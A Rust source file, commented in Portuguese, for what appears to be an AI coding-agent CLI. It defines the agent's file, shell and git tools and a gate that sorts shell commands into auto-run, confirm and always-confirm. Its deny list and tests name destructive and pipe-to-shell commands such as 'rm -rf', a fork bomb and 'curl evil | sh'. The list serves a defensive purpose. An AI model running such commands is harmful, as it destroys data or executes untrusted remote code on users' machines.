//! Ferramentas locais (docs/ferramentas.md). Registry: nome → schema JSON
//! (enviado ao modelo) + executor. Leitura (C1) + escrita/exec/git (C2). Tudo
//! confinado à raiz do projeto (guard) e respeitando `.gitignore` (ignore).
//! Gate por ferramenta via `Frontend`: leitura/git-read = `Auto`;
//! edit/write/git_commit = `Confirm` (monta o `Preview` — diff/comando — e o
//! frontend mostra + pergunta); bash = classificado. Nada escreve/roda sem
//! aprovação. As ferramentas NÃO imprimem nada direto (quem renderiza é o
//! frontend — CLI ANSI ou JSON) → o mesmo executor serve terminal e host.
//!
//! (Um único arquivo no C1/C2; split em `tools/{fs,edit,shell,git}.rs` é cleanup
//! futuro — ver docs/arquitetura-cli.md.)

use crate::frontend::Frontend;
use crate::gate::{Policy, Preview};
use crate::guard;
use crate::types::{ToolCall, ToolDef};
use globset::Glob;
use ignore::WalkBuilder;
use serde_json::json;
use std::path::Path;
use std::process::Command;

const MAX_BYTES: usize = 64 * 1024;
const MAX_HITS: usize = 200;
const MAX_OUTPUT: usize = 32 * 1024;

/// Defs enviadas ao modelo (`tools[]` do protocolo).
pub fn defs() -> Vec<ToolDef> {
    let def = |name: &str, description: &str, props: serde_json::Value, req: serde_json::Value| ToolDef {
        name: name.into(),
        description: description.into(),
        parameters: json!({ "type": "object", "properties": props, "required": req }),
    };
    vec![
        def("read_file", "Lê um arquivo de texto do projeto.",
            json!({
                "path": {"type":"string","description":"Caminho relativo à raiz do projeto."},
                "max_bytes": {"type":"integer","description":"Teto opcional (default 65536)."}
            }), json!(["path"])),
        def("list_dir", "Lista arquivos e pastas de um diretório (respeita .gitignore).",
            json!({"path": {"type":"string","description":"Relativo à raiz ('.' = raiz)."}}), json!(["path"])),
        def("grep", "Busca um regex nos arquivos do projeto.",
            json!({
                "pattern": {"type":"string","description":"Regex (sintaxe Rust)."},
                "path": {"type":"string","description":"Subárvore (default: raiz)."},
                "glob": {"type":"string","description":"Filtro de arquivo, ex.: '*.rs'."}
            }), json!(["pattern"])),
        def("glob", "Lista arquivos por padrão glob (ex.: src/**/*.rs).",
            json!({"pattern": {"type":"string"}}), json!(["pattern"])),
        def("edit_file", "Edita um arquivo por substituição exata de trecho (mostra diff, pede confirmação).",
            json!({
                "path": {"type":"string"},
                "old_string": {"type":"string","description":"Trecho EXATO a substituir (único, salvo replace_all)."},
                "new_string": {"type":"string"},
                "replace_all": {"type":"boolean","description":"Substituir todas as ocorrências (default false)."}
            }), json!(["path","old_string","new_string"])),
        def("write_file", "Cria ou sobrescreve um arquivo (mostra diff, pede confirmação).",
            json!({"path": {"type":"string"}, "content": {"type":"string"}}), json!(["path","content"])),
        def("bash", "Roda um comando no diretório do projeto (allowlist roda direto; destrutivo confirma sempre).",
            json!({
                "command": {"type":"string"},
                "why": {"type":"string","description":"1 linha: por que este comando."}
            }), json!(["command"])),
        def("git_status", "git status (branch + arquivos alterados).", json!({}), json!([])),
        def("git_diff", "git diff das mudanças (staged com staged=true).",
            json!({"staged": {"type":"boolean"}}), json!([])),
        def("git_commit", "Commita as mudanças (mostra o diff staged, pede confirmação).",
            json!({
                "message": {"type":"string","description":"Mensagem do commit."},
                "add_all": {"type":"boolean","description":"git add -A antes (default false)."}
            }), json!(["message"])),
    ]
}

/// Ferramentas do modo host (`--tools host`): só o shell. O `anna` PROPÕE um
/// comando e a casca externa (ex.: SShvTerm) executa no host dela, com a
/// política/PTY/auditoria própria — mapeia 1:1 no `propose_command` do SShvTerm.
pub fn defs_host() -> Vec<ToolDef> {
    defs().into_iter().filter(|d| d.name == "bash").collect()
}

/// Executa um tool call localmente e devolve o `content` da mensagem role=tool.
/// O `fe` (frontend) decide as aprovações e renderiza os previews.
pub fn run(call: &ToolCall, root: &Path, fe: &mut dyn Frontend) -> String {
    let a = &call.arguments;
    let s = |k: &str| a.get(k).and_then(|v| v.as_str()).unwrap_or_default().to_string();
    let b = |k: &str| a.get(k).and_then(|v| v.as_bool()).unwrap_or(false);
    match call.name.as_str() {
        "read_file" => {
            let bytes = a.get("max_bytes").and_then(|v| v.as_u64()).map(|n| n as usize).unwrap_or(MAX_BYTES);
            read_file(root, &s("path"), bytes)
        }
        "list_dir" => list_dir(root, &s("path")),
        "grep" => grep(root, &s("pattern"), &s("path"), &s("glob")),
        "glob" => glob_files(root, &s("pattern")),
        "edit_file" => edit_file(root, &s("path"), &s("old_string"), &s("new_string"), b("replace_all"), &call.id, fe),
        "write_file" => write_file(root, &s("path"), &s("content"), &call.id, fe),
        "bash" => bash(root, &s("command"), &s("why"), &call.id, fe),
        "git_status" => run_git(root, &["status", "--short", "--branch"]),
        "git_diff" => {
            let mut args = vec!["diff"];
            if b("staged") { args.push("--staged"); }
            run_git(root, &args)
        }
        "git_commit" => git_commit(root, &s("message"), b("add_all"), &call.id, fe),
        other => format!("ERRO: ferramenta desconhecida '{other}'."),
    }
}

fn rel_of(root: &Path, p: &Path) -> String {
    p.strip_prefix(root).unwrap_or(p).to_string_lossy().replace('\\', "/")
}

// ── Leitura (C1) ────────────────────────────────────────────────────────────

fn read_file(root: &Path, path: &str, max_bytes: usize) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    let Some(full) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    if !full.is_file() {
        return format!("ERRO: '{path}' não é um arquivo.");
    }
    match std::fs::read(&full) {
        Ok(bytes) => {
            let total = bytes.len();
            let slice = if total > max_bytes { &bytes[..max_bytes] } else { &bytes[..] };
            let mut out = String::from_utf8_lossy(slice).into_owned();
            if total > max_bytes {
                out.push_str(&format!("\n… [truncado: {total} bytes no total, mostrando {max_bytes}]"));
            }
            out
        }
        Err(e) => format!("ERRO: falha ao ler '{path}': {e}"),
    }
}

fn list_dir(root: &Path, path: &str) -> String {
    let Some(dir) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    if !dir.is_dir() {
        return format!("ERRO: '{path}' não é um diretório.");
    }
    let mut entries: Vec<String> = WalkBuilder::new(&dir)
        .max_depth(Some(1))
        .hidden(false)
        .build()
        .filter_map(Result::ok)
        .filter(|e| e.depth() == 1)
        .map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) { format!("{name}/") } else { name }
        })
        .collect();
    entries.sort();
    if entries.is_empty() { "(vazio)".into() } else { entries.join("\n") }
}

fn grep(root: &Path, pattern: &str, path: &str, glob: &str) -> String {
    let re = match regex::Regex::new(pattern) {
        Ok(r) => r,
        Err(e) => return format!("ERRO: regex inválido: {e}"),
    };
    let matcher = if glob.is_empty() {
        None
    } else {
        match Glob::new(glob) {
            Ok(g) => Some(g.compile_matcher()),
            Err(e) => return format!("ERRO: glob inválido: {e}"),
        }
    };
    let base = if path.is_empty() {
        root.to_path_buf()
    } else {
        match guard::resolve(root, path) {
            Some(p) => p,
            None => return format!("ERRO: '{path}' inexistente ou fora do projeto."),
        }
    };
    let mut hits: Vec<String> = Vec::new();
    'walk: for entry in WalkBuilder::new(&base).build().filter_map(Result::ok) {
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
            continue;
        }
        let p = entry.path();
        if let Some(m) = &matcher {
            if !m.is_match(p.file_name().unwrap_or_default()) {
                continue;
            }
        }
        let Ok(content) = std::fs::read_to_string(p) else { continue };
        for (i, line) in content.lines().enumerate() {
            if re.is_match(line) {
                hits.push(format!("{}:{}: {}", rel_of(root, p), i + 1, line.trim()));
                if hits.len() >= MAX_HITS {
                    hits.push(format!("… [cortado em {MAX_HITS} resultados]"));
                    break 'walk;
                }
            }
        }
    }
    if hits.is_empty() { "(nenhum resultado)".into() } else { hits.join("\n") }
}

fn glob_files(root: &Path, pattern: &str) -> String {
    let matcher = match Glob::new(pattern) {
        Ok(g) => g.compile_matcher(),
        Err(e) => return format!("ERRO: glob inválido: {e}"),
    };
    let mut found: Vec<String> = Vec::new();
    for entry in WalkBuilder::new(root).build().filter_map(Result::ok) {
        if found.len() >= MAX_HITS {
            break;
        }
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
            continue;
        }
        let rel = rel_of(root, entry.path());
        if matcher.is_match(rel.as_str()) {
            found.push(rel);
        }
    }
    found.sort();
    if found.is_empty() { "(nenhum arquivo)".into() } else { found.join("\n") }
}

// ── Escrita (C2) — Preview + aprovação via frontend ─────────────────────────

fn edit_file(root: &Path, path: &str, old: &str, new: &str, replace_all: bool, id: &str, fe: &mut dyn Frontend) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    // old_string vazio casa em toda fronteira de char (matches("") = len+1): com
    // replace_all destruiria o arquivo (insere new entre cada char); sem, faria um
    // prepend silencioso. Para criar/inserir, a ferramenta certa é write_file.
    if old.is_empty() {
        return "ERRO: old_string vazio não é permitido — use write_file para criar ou gerar o conteúdo.".into();
    }
    let Some(full) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    let Ok(content) = std::fs::read_to_string(&full) else {
        return format!("ERRO: não consegui ler '{path}' como texto.");
    };
    let count = content.matches(old).count();
    if count == 0 {
        return "ERRO: old_string não encontrado no arquivo (copie o trecho EXATO).".into();
    }
    if count > 1 && !replace_all {
        return format!("ERRO: old_string aparece {count}x — dê mais contexto pra ser único, ou use replace_all.");
    }
    let updated = if replace_all { content.replace(old, new) } else { content.replacen(old, new, 1) };
    let preview = Preview::Diff { path, old: content.as_str(), new: updated.as_str() };
    if !fe.approve(Policy::Confirm, "edit_file", id, &preview) {
        return "RECUSADO: edição cancelada pelo usuário.".into();
    }
    crate::checkpoint::snapshot(root, &format!("edit_file {path}"));
    match std::fs::write(&full, updated) {
        Ok(_) => format!("ok — {path} editado ({} ocorrência(s)).", if replace_all { count } else { 1 }),
        Err(e) => format!("ERRO: falha ao gravar '{path}': {e}"),
    }
}

fn write_file(root: &Path, path: &str, content: &str, id: &str, fe: &mut dyn Frontend) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    let Some(full) = guard::resolve_new(root, path) else {
        return format!("ERRO: pasta-pai de '{path}' inexistente ou fora do projeto.");
    };
    let existed = full.exists();
    let old = std::fs::read_to_string(&full).unwrap_or_default();
    // "Sem mudanças" só vale se o arquivo JÁ existe com esse conteúdo. Sem o
    // `existed`, criar um arquivo novo vazio (content=="") batia com o
    // unwrap_or_default() de um arquivo inexistente ("") e retornava "sem mudanças"
    // sem nunca gravar — o arquivo nunca era criado (erro silencioso).
    if existed && old == content {
        return format!("ok — '{path}' já tem esse conteúdo (sem mudanças).");
    }
    let preview = Preview::Diff { path, old: old.as_str(), new: content };
    if !fe.approve(Policy::Confirm, "write_file", id, &preview) {
        return "RECUSADO: escrita cancelada pelo usuário.".into();
    }
    crate::checkpoint::snapshot(root, &format!("write_file {path}"));
    match std::fs::write(&full, content) {
        Ok(_) => format!("ok — '{path}' {} ({} bytes).", if existed { "sobrescrito" } else { "criado" }, content.len()),
        Err(e) => format!("ERRO: falha ao gravar '{path}': {e}"),
    }
}

// ── Shell (C2) — classificação + captura ────────────────────────────────────

fn bash(root: &Path, command: &str, why: &str, id: &str, fe: &mut dyn Frontend) -> String {
    if command.trim().is_empty() {
        return "ERRO: comando vazio.".into();
    }
    let policy = classify(command);
    let preview = Preview::Command { command, why };
    if !fe.approve(policy, "bash", id, &preview) {
        return "RECUSADO: comando cancelado pelo usuário.".into();
    }
    // Comando destrutivo aprovado: foto antes — /rollback devolve os arquivos
    // RASTREADOS que ele apagar/alterar (o que estiver fora do git, não).
    if is_destructive(command) {
        crate::checkpoint::snapshot(root, &format!("bash destrutivo: {}", cap(command, 60)));
    }
    match Command::new("sh").arg("-c").arg(command).current_dir(root).output() {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.trim().is_empty() {
                s.push_str("\n[stderr]\n");
                s.push_str(&err);
            }
            let code = o.status.code().unwrap_or(-1);
            format!("{}\n[exit {code}]", cap(&s, MAX_OUTPUT))
        }
        Err(e) => format!("ERRO: falha ao executar: {e}"),
    }
}

/// Política do comando: destrutivo (Always) > allowlist simples (Auto) > Confirm.
fn classify(cmd: &str) -> Policy {
    if is_destructive(cmd) {
        Policy::Always
    } else if is_simple_allowlisted(cmd) {
        Policy::Auto
    } else {
        Policy::Confirm
    }
}

fn is_destructive(cmd: &str) -> bool {
    let c = cmd.to_lowercase();
    c.contains("rm -rf") || c.contains("rm -fr") || c.contains("rm -r -f")
        || c.contains("git push")
        || c.contains("git reset --hard")
        || c.contains("git clean -fd") || c.contains("git clean -df")
        || c.contains("mkfs") || c.starts_with("dd ") || c.contains(" dd ")
        || c.contains("chmod -r 777") || c.contains("chmod 777 -r")
        || c.contains("| sh") || c.contains("| bash") || c.contains("|sh") || c.contains("|bash")
        || c.contains("drop table") || c.contains("truncate table")
        || c.contains(":(){")
}

/// Comandos de LEITURA que rodam sem perguntar (regra do produto: "leitura = auto").
///
/// Cresceu em 19/08 depois de um relato concreto: o gate pedia aprovação para
/// quase toda inspeção, e a maioria era `grep`, `sed -n`, `find` — ferramentas de
/// leitura que simplesmente não estavam aqui. Gate que pergunta demais treina o
/// dev a aprovar sem ler, que é o oposto do que ele existe para fazer.
///
/// Entra aqui o que **não escreve, não apaga e não sai para a rede**. `curl`,
/// `wget`, `ssh`, `docker` e afins ficam de fora de propósito.
const ALLOWLIST: &[&str] = &[
    // Navegação e leitura de arquivo
    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "file", "cd", "stat",
    "tree", "du", "df", "basename", "dirname", "realpath", "readlink",
    // Busca e filtro (o grosso do que faltava)
    "grep", "egrep", "fgrep", "rg", "ag", "awk", "cut", "sort", "uniq", "nl",
    "diff", "jq", "column", "tr", "which", "type", "command -v",
    // Git só-leitura
    "git status", "git diff", "git log", "git show", "git branch",
    "git rev-parse", "git ls-files", "git blame", "git describe",
    "git remote -v", "git stash list", "git worktree list", "git config --get",
    // Build/teste (já rodavam)
    "composer test", "npm test", "npm run", "cargo check", "cargo clippy",
    "cargo test", "cargo build", "php -l", "phpunit", "pytest", "make test",
];

/// `find` é leitura **até deixar de ser**: `-delete` apaga, `-exec`/`-ok` executam
/// comando arbitrário e `-fprint*`/`-fls` gravam arquivo. Por isso não entra na
/// lista de prefixo — entra com guarda, e na dúvida cai para `Confirm`.
///
/// **`sed` ficou DE FORA de propósito**, e vale registrar por quê: `sed -n` é
/// leitura, mas `sed -n 's/a/b/w saida'` grava — o `w` é um comando do script, e
/// distingui-lo de um `w` que só faz parte de um padrão (`/warn/p`) exige parsear
/// sed de verdade. A opção era uma guarda que ou deixa passar escrita, ou reprova
/// `/warn/p` e volta a encher o dev de pergunta. Guarda incompleta em gate de
/// segurança é pior que ausência de guarda, então `sed` continua pedindo
/// aprovação — e quem quer intervalo de linhas tem `head`, `tail` e `awk`, todos
/// aqui e sem essa ambiguidade.
fn leitura_condicional(seg: &str) -> Option<bool> {
    let c = seg.trim();
    if c == "find" || c.starts_with("find ") {
        let mau = c.contains("-delete") || c.contains("-exec") || c.contains("-ok")
            || c.contains("-fprint") || c.contains("-fls");
        return Some(!mau);
    }
    None
}

/// Varre o comando **com consciência de aspas** e devolve os segmentos separados
/// por `&&`, ou `None` se encontrar qualquer metacaractere que o gate recusa.
///
/// Duas correções que a versão ingênua (um `contains`/`replace` na string crua)
/// não tinha, e as duas apareceram no mesmo comando real —
/// `awk 'NR>=37 && NR<=46' x`:
///
///  1. o `&&` estava DENTRO do script e virava dois pedaços sem sentido;
///  2. o `>=` fazia o `contains('>')` recusar o comando como se houvesse
///     redirecionamento.
///
/// Os dois erram para o lado seguro (perguntar a mais), mas era exatamente o
/// `awk` que existe aqui como alternativa ao `sed` — então o conserto é no
/// scanner, não nos testes.
///
/// **Aspas simples e duplas NÃO são equivalentes**, e a diferença é de segurança:
/// dentro de `'…'` tudo é literal; dentro de `"…"` o shell ainda expande
/// `$(…)` e crase. Por isso substituição de comando é recusada mesmo entre aspas
/// duplas.
fn dividir_por_and(cmd: &str) -> Option<Vec<String>> {
    let mut segs = Vec::new();
    let mut atual = String::new();
    let mut aspa: Option<char> = None;
    let mut it = cmd.chars().peekable();

    while let Some(ch) = it.next() {
        // Substituição de comando expande em tudo que não seja aspa simples.
        if aspa != Some('\'') && (ch == '`' || (ch == '$' && it.peek() == Some(&'('))) {
            return None;
        }
        match aspa {
            // Dentro de aspas: só a aspa de fechamento tem significado.
            Some(a) => {
                if ch == a {
                    aspa = None;
                }
                atual.push(ch);
            }
            None => match ch {
                '\'' | '"' => { aspa = Some(ch); atual.push(ch); }
                '>' | '<' | '|' | ';' => return None, // redireciona, encadeia ou pipa
                '&' => {
                    if it.peek() == Some(&'&') {
                        it.next();
                        segs.push(std::mem::take(&mut atual));
                    } else {
                        return None; // `&` de background
                    }
                }
                c => atual.push(c),
            },
        }
    }
    // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
    if aspa.is_some() {
        return None;
    }
    segs.push(atual);
    Some(segs)
}

fn segmento_permitido(seg: &str) -> bool {
    let c = seg.trim();
    if c.is_empty() {
        return false;
    }
    if let Some(ok) = leitura_condicional(c) {
        return ok;
    }
    ALLOWLIST.iter().any(|pfx| c == *pfx || c.starts_with(&format!("{pfx} ")))
}

/// Público no crate porque o gate determinístico do orquestrador só roda o que
/// o `bash` já aprovaria sozinho (`Policy::Auto`) — o gate não pode virar porta
/// dos fundos pra executar comando sem o dev ver.
pub(crate) fn is_simple_allowlisted(cmd: &str) -> bool {
    let c = cmd.trim();

    // Metacaracteres que redirecionam, substituem ou rodam em paralelo derrubam o
    // comando inteiro: escondem efeito que a leitura do segmento não revela. A
    // checagem é feita pelo scanner, que sabe o que está entre aspas.
    //
    // `&&` é a EXCEÇÃO, e é ela que devolve o silêncio ao gate. O agente compõe
    // `cd <pasta> && grep ...` o tempo todo; antes disto, um encadeamento de dois
    // comandos de leitura pedia aprovação porque a string tinha "&&" — e o dev
    // aprovava `cd X && ls` vinte vezes por sessão. Cada segmento é conferido
    // isoladamente e TODOS têm de passar; basta um fora da lista para virar
    // `Confirm`. O `is_destructive` já rodou sobre a string INTEIRA antes daqui.
    // (`||` cai no `|` dentro do scanner.)
    match dividir_por_and(c) {
        None => false, // `&` fora de aspas que não é `&&` = background
        Some(segs) => segs.iter().all(|s| segmento_permitido(s)),
    }
}

fn cap(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}\n… [saída cortada em {max} bytes]", &s[..max])
    }
}

// ── Git (C2) ────────────────────────────────────────────────────────────────

fn run_git(root: &Path, args: &[&str]) -> String {
    match Command::new("git").args(args).current_dir(root).output() {
        Ok(o) => {
            let out = String::from_utf8_lossy(&o.stdout);
            let err = String::from_utf8_lossy(&o.stderr);
            let combined = if err.trim().is_empty() { out.into_owned() } else { format!("{out}{err}") };
            let combined = combined.trim();
            if combined.is_empty() { "(sem saída)".into() } else { cap(combined, MAX_OUTPUT) }
        }
        Err(e) => format!("ERRO: git falhou ({e}). Está num repositório git?"),
    }
}

fn git_commit(root: &Path, message: &str, add_all: bool, id: &str, fe: &mut dyn Frontend) -> String {
    if message.trim().is_empty() {
        return "ERRO: mensagem de commit vazia.".into();
    }
    if add_all {
        let _ = run_git(root, &["add", "-A"]);
    }
    let staged = run_git(root, &["diff", "--staged", "--stat"]);
    if staged.starts_with("ERRO") {
        return staged;
    }
    if staged == "(sem saída)" {
        return "ERRO: nada staged pra commitar (use add_all=true ou faça git add antes).".into();
    }
    let preview = Preview::Commit { stat: staged.as_str(), message };
    if !fe.approve(Policy::Confirm, "git_commit", id, &preview) {
        return "RECUSADO: commit cancelado pelo usuário.".into();
    }
    run_git(root, &["commit", "-m", message])
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::gate::Policy;
    use crate::ui::Ui;

    fn sandbox() -> std::path::PathBuf {
        // Dir ÚNICO por chamada (os testes rodam em paralelo — não podem
        // compartilhar o mesmo temp senão um apaga os arquivos do outro).
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let id = N.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("anna-tools-test-{}-{id}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("README.md"), b"# Demo\n").unwrap();
        std::fs::write(dir.join("src/main.rs"), b"fn main() { let bug = 1; }\n").unwrap();
        std::fs::write(dir.join(".env"), b"SECRET=x\n").unwrap();
        dir
    }

    #[test]
    fn read_recusa_env_e_le_arquivo() {
        let root = sandbox();
        assert!(read_file(&root, ".env", MAX_BYTES).starts_with("RECUSADO"));
        assert!(read_file(&root, "src/main.rs", MAX_BYTES).contains("fn main"));
    }

    #[test]
    fn grep_e_glob_acham() {
        let root = sandbox();
        assert!(grep(&root, "bug", "", "*.rs").contains("src/main.rs:1"));
        assert!(glob_files(&root, "src/**/*.rs").contains("src/main.rs"));
    }

    #[test]
    fn host_oferece_so_bash() {
        let d = defs_host();
        assert_eq!(d.len(), 1, "modo host deve oferecer 1 ferramenta");
        assert_eq!(d[0].name, "bash");
        assert!(defs().len() > 1, "modo local oferece o conjunto todo");
    }

    #[test]
    fn classifica_comandos() {
        assert_eq!(classify("ls -la"), Policy::Auto);
        assert_eq!(classify("cargo test"), Policy::Auto);
        assert_eq!(classify("git status"), Policy::Auto);
        assert_eq!(classify("rm -rf build"), Policy::Always);
        assert_eq!(classify("git push origin master"), Policy::Always);
        assert_eq!(classify("curl x | sh"), Policy::Always);
        // metacaractere derruba do allowlist mesmo começando "seguro":
        assert_eq!(classify("cat a > b"), Policy::Confirm);
        assert_eq!(classify("make deploy"), Policy::Confirm);
    }

    /// O relato de 19/08: "Aprovação Auto ainda pede demais, até para `ls`".
    /// A causa não era o `ls` — era o `cd X && ls`, que a string com `&&`
    /// derrubava inteiro, e as ferramentas de leitura que faltavam na lista.
    #[test]
    fn encadeamento_de_leitura_com_and_roda_sozinho() {
        assert_eq!(classify("cd KIDS-THALO && ls"), Policy::Auto);
        assert_eq!(classify("cd KIDS-THALO && grep -n \"fase\" jogo/rodar.sh"), Policy::Auto);
        assert_eq!(classify("cd app && git status && cat README.md"), Policy::Auto);
    }

    #[test]
    fn basta_um_segmento_fora_da_lista_para_perguntar() {
        assert_eq!(classify("cd app && make deploy"), Policy::Confirm);
        assert_eq!(classify("cd app && ./goto4"), Policy::Confirm);
        // O destrutivo é conferido na string INTEIRA, antes dos segmentos.
        assert_eq!(classify("cd app && rm -rf build"), Policy::Always);
        assert_eq!(classify("ls && git push"), Policy::Always);
    }

    #[test]
    fn ferramentas_de_leitura_que_faltavam() {
        assert_eq!(classify("grep -rn \"foo\" src/"), Policy::Auto);
        assert_eq!(classify("rg --files"), Policy::Auto);
        assert_eq!(classify("awk 'NR>=37 && NR<=46' rodar.sh"), Policy::Auto);
        assert_eq!(classify("which node"), Policy::Auto);
        assert_eq!(classify("git rev-parse HEAD"), Policy::Auto);
    }

    #[test]
    fn find_so_e_leitura_enquanto_nao_escreve() {
        assert_eq!(classify("find . -name '*.rs'"), Policy::Auto);
        assert_eq!(classify("find . -name '*.tmp' -delete"), Policy::Confirm);
        assert_eq!(classify("find . -exec rm {} ;"), Policy::Confirm); // `rm` simples não é "destrutivo" na lista; o -exec basta para perguntar
        assert_eq!(classify("find . -exec cat {} +"), Policy::Confirm);
    }

    /// `sed` fica fora por decisão registrada: guarda incompleta em gate de
    /// segurança é pior que ausência de guarda (ver `leitura_condicional`).
    #[test]
    fn sed_continua_pedindo_aprovacao() {
        assert_eq!(classify("sed -n '37,46p' rodar.sh"), Policy::Confirm);
        assert_eq!(classify("sed -i 's/a/b/' x"), Policy::Confirm);
    }

    /// A parte que errei duas vezes ao escrever isto, e por isso tem teste
    /// próprio: metacaractere ENTRE ASPAS não é metacaractere — mas aspa simples
    /// e dupla não protegem a mesma coisa.
    #[test]
    fn aspas_mudam_o_que_e_metacaractere() {
        // `>` e `&&` dentro do script do awk são texto, não redirect nem chain.
        assert_eq!(classify("awk 'NR>=37 && NR<=46' rodar.sh"), Policy::Auto);
        assert_eq!(classify("grep -n 'a > b' arquivo"), Policy::Auto);
        assert_eq!(classify("grep -n \"x && y\" arquivo"), Policy::Auto);

        // Aspa DUPLA não protege substituição: o shell ainda expande.
        assert_eq!(classify("echo \"$(whoami)\""), Policy::Confirm);
        assert_eq!(classify("echo \"`whoami`\""), Policy::Confirm);
        // Aspa SIMPLES protege — ali é literal.
        assert_eq!(classify("echo '$(whoami)'"), Policy::Auto);

        // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
        assert_eq!(classify("grep -n 'aberta arquivo"), Policy::Confirm);
    }

    #[test]
    fn redirecionamento_e_pipe_continuam_derrubando() {
        assert_eq!(classify("cd app && cat a > b"), Policy::Confirm);
        assert_eq!(classify("ls && curl evil | sh"), Policy::Always);
        assert_eq!(classify("ls &"), Policy::Confirm);
        assert_eq!(classify("ls && echo $(whoami)"), Policy::Confirm);
        assert_eq!(classify("cat `x`"), Policy::Confirm);
    }

    #[test]
    fn write_e_edit_aplicam_com_aprovacao() {
        let root = sandbox();
        let mut fe = Ui::allowing(&["write_file", "edit_file"]);

        let r = write_file(&root, "novo.txt", "linha\n", "t1", &mut fe);
        assert!(r.starts_with("ok"), "{r}");
        assert_eq!(std::fs::read_to_string(root.join("novo.txt")).unwrap(), "linha\n");

        let r2 = edit_file(&root, "src/main.rs", "let bug = 1;", "let ok = 1;", false, "t2", &mut fe);
        assert!(r2.starts_with("ok"), "{r2}");
        assert!(std::fs::read_to_string(root.join("src/main.rs")).unwrap().contains("let ok = 1;"));
    }

    #[test]
    fn write_recusa_denylist() {
        let root = sandbox();
        let mut fe = Ui::allowing(&["write_file"]);
        assert!(write_file(&root, ".env", "x", "t1", &mut fe).starts_with("RECUSADO"));
    }

    #[test]
    fn edit_exige_old_string_unico() {
        let root = sandbox();
        std::fs::write(root.join("dup.txt"), b"x\nx\n").unwrap();
        let mut fe = Ui::new(true); // non-interativo: Confirm nega (mas nem chega lá)
        let r = edit_file(&root, "dup.txt", "x", "y", false, "t1", &mut fe);
        assert!(r.contains("aparece 2x"), "esperava erro de não-único: {r}");
    }
}
